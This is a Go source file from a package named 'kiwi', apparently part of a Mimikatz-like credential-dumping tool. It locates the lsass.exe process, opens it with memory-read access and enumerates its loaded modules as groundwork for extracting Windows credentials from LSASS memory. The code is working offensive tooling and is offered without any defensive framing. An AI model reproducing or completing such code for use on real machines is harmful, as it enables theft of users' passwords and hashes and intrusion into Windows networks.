package kiwi

import (
	"sort"
	"strings"

	"github.com/pkg/errors"
	"golang.org/x/sys/windows"

	"project/internal/logger"
	"project/internal/module/windows/api"
)

// lsass contains PID and module information about lsass.exe.
type lsass struct {
	ctx *Kiwi

	pid     uint32
	modules []*basicModuleInfo
}

func newLsass(ctx *Kiwi) *lsass {
	return &lsass{ctx: ctx}
}

func (lsass *lsass) logf(lv logger.Level, format string, log ...interface{}) {
	lsass.ctx.logger.Printf(lv, "kiwi-lsass", format, log...)
}

func (lsass *lsass) log(lv logger.Level, log ...interface{}) {
	lsass.ctx.logger.Println(lv, "kiwi-lsass", log...)
}

func (lsass *lsass) getPID() (uint32, error) {
	if lsass.pid != 0 {
		return lsass.pid, nil
	}
	pid, err := api.GetProcessIDByName("lsass.exe")
	if err != nil {
		return 0, err
	}
	defer func() {
		lsass.logf(logger.Info, "PID is %d", lsass.pid)
	}()
	l := len(pid)
	if l == 1 {
		lsass.pid = pid[0]
		return lsass.pid, nil
	}
	// if appear multi PID, select minimize
	ps := make([]int, l)
	for i := 0; i < l; i++ {
		ps[i] = int(pid[i])
	}
	sort.Ints(ps)
	lsass.pid = uint32(ps[0])
	return lsass.pid, nil
}

func (lsass *lsass) OpenProcess() (windows.Handle, error) {
	// check is running on WOW64
	wow64, err := lsass.ctx.isWow64()
	if err != nil {
		return 0, err
	}
	if wow64 {
		return 0, errors.New("kiwi (x86) can't access x64 process")
	}
	pid, err := lsass.getPID()
	if err != nil {
		return 0, errors.WithMessage(err, "failed to get pid about lsass.exe")
	}
	major, _, _ := lsass.ctx.getWindowsVersion()
	var da uint32 = windows.PROCESS_VM_READ
	if major < 6 {
		da |= windows.PROCESS_QUERY_INFORMATION
	} else {
		da |= windows.PROCESS_QUERY_LIMITED_INFORMATION
	}
	return api.OpenProcess(da, false, pid)
}

func (lsass *lsass) GetBasicModuleInfo(pHandle windows.Handle, name string) (*basicModuleInfo, error) {
	if len(lsass.modules) == 0 {
		modules, err := lsass.ctx.getVeryBasicModuleInfo(pHandle)
		if err != nil {
			return nil, err
		}
		lsass.modules = modules
		lsass.log(logger.Info, "load module information successfully")
	}
	for _, module := range lsass.modules {
		if strings.EqualFold(module.name, name) {
			return module, nil
		}
	}
	return nil, errors.Errorf("module %s is not exist in lsass.exe", name)
}

func (lsass *lsass) Close() {
	lsass.ctx = nil
}
